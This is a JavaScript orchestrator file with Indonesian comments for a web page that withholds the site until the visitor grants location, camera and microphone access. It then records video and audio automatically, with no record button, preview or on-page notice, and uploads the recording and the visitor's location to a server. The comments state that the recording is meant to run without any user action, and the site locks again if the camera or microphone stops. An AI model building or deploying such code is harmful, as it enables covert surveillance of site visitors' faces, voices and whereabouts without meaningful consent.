// app.js = ORCHESTRATOR.
//
// Urutan: lokasi -> kamera -> mikrofon -> ACCESS_GRANTED -> rekaman otomatis.
// Tidak ada tombol rekam, tidak ada preview, tidak ada teks UI yang ditulis.
// app.js hanya mengisi atribut `data-*` pada elemen yang ADA, dan memancarkan
// dua CustomEvent supaya UI bisa di-desain ulang tanpa menyentuh file ini.
//
// Semua getElementById di bawah OPSIONAL: menghapus elemen dari index.html
// tidak boleh merusak logic permission maupun recording.

import { createGate, PERM } from './permissions.js'
import { requestLocation } from './location.js'
import * as camera from './camera.js'
import * as microphone from './microphone.js'
import { createRecorder, combineStreams, RECORDER_STATE } from './recorder.js'
import { sendLocation, uploadRecording } from './api.js'
import { sessionId } from './session.js'

console.log('[app] module loaded, sessionId:', sessionId)

const $ = (id) => document.getElementById(id)

const gateEl = $('access-gate')
const statusEl = $('access-status')
const retryEl = $('access-retry')

let locationPayload = null
let recorder = null
let started = false
let uploading = false

// Gate mengulang adapter yang sama; hasil lokasi dipakai ulang supaya tidak
// ada dua prompt lokasi dalam satu sesi.
const gate = createGate({
  location: async () => {
    locationPayload = await requestLocation()
  },
  camera: () => camera.requestCamera(),
  microphone: () => microphone.requestMicrophone(),
})

function broadcast(type, detail) {
  document.dispatchEvent(new CustomEvent(type, { detail }))
}

function paint(snap) {
  const recState = recorder ? recorder.state : RECORDER_STATE.IDLE

  for (const node of [gateEl, statusEl]) {
    if (!node) continue
    node.dataset.state = snap.state
    node.dataset.unlocked = String(snap.unlocked)
    node.dataset.recording = recState
    node.dataset.permissionLocation = snap.perm.location
    node.dataset.permissionCamera = snap.perm.camera
    node.dataset.permissionMicrophone = snap.perm.microphone
    if (snap.reason) node.dataset.reason = snap.reason
    else delete node.dataset.reason
  }

  // Tombol retry hanya muncul kalau ada izin yang gagal. UI bebas menata ulang.
  const blocked = Object.values(snap.perm).some(
    (s) => s === PERM.DENIED || s === PERM.UNAVAILABLE,
  )
  if (retryEl) retryEl.hidden = snap.unlocked || !blocked
}

async function flushRecording() {
  if (!recorder || uploading) return
  const result = await recorder.stop()
  if (!result || !result.blob.size) return
  uploading = true
  try {
    await uploadRecording(result.blob, recorder.buildUploadMeta(result))
  } catch (err) {
    console.warn('[recording] upload gagal:', err.message)
  } finally {
    uploading = false
  }
}

async function startSession() {
  // subscribe() dipanggil pada setiap perubahan state, jadi efek ini wajib
  // di-guard supaya recorder tidak pernah dibuat dua kali.
  if (started) return
  // Stream bisa saja mati di antara ACCESS_GRANTED dan baris di bawah.
  if (!camera.isCameraLive() || !microphone.isMicrophoneLive()) {
    gate.markStreamLost(camera.isCameraLive() ? 'microphone' : 'camera')
    return
  }

  started = true

  // Rekaman otomatis. Tidak ada tombol, tidak perlu klik user.
  try {
    recorder = createRecorder(
      combineStreams([camera.getCameraStream(), microphone.getMicrophoneStream()]),
      { sessionId, kind: 'video', onStateChange: (s) => broadcast('access-recording', s) },
    )
    recorder.start()
  } catch (err) {
    console.warn('[recording] tidak bisa mulai:', err.message)
    broadcast('access-recording', { state: 'error', error: err.message, durationMs: 0 })
  }

  if (!locationPayload) return
  try {
    await sendLocation(locationPayload)
  } catch (err) {
    console.warn('[location] gagal dikirim:', err.message)
  }
}

gate.subscribe((snap) => {
  console.log('[gate] state:', snap.state, 'unlocked:', snap.unlocked, 'perm:', snap.perm)
  paint(snap)
  broadcast('access-state', snap)
  if (snap.unlocked) startSession()
})

// Stream mati di tengah sesi -> rekaman berhenti, website terkunci lagi.
camera.onCameraEnded(() => {
  gate.markStreamLost('camera')
  flushRecording()
})
microphone.onMicrophoneEnded(() => {
  gate.markStreamLost('microphone')
  flushRecording()
})

if (retryEl) retryEl.addEventListener('click', () => gate.retry())

// Sesi berakhir: rekaman ditutup, diupload kalau sempat, lalu track dimatikan
// supaya indikator kamera/mikrofon di browser ikut mati.
// ponytail: upload saat unload bisa dibatalkan browser (fetch keepalive limited
// 64KB). Kalau rekaman jangka panjang wajib utuh, tambah upload per-chunk.
window.addEventListener('pagehide', () => {
  flushRecording()
  camera.stopStream()
  microphone.stopStream()
})

console.log('[app] starting permission gate...')
gate.run()
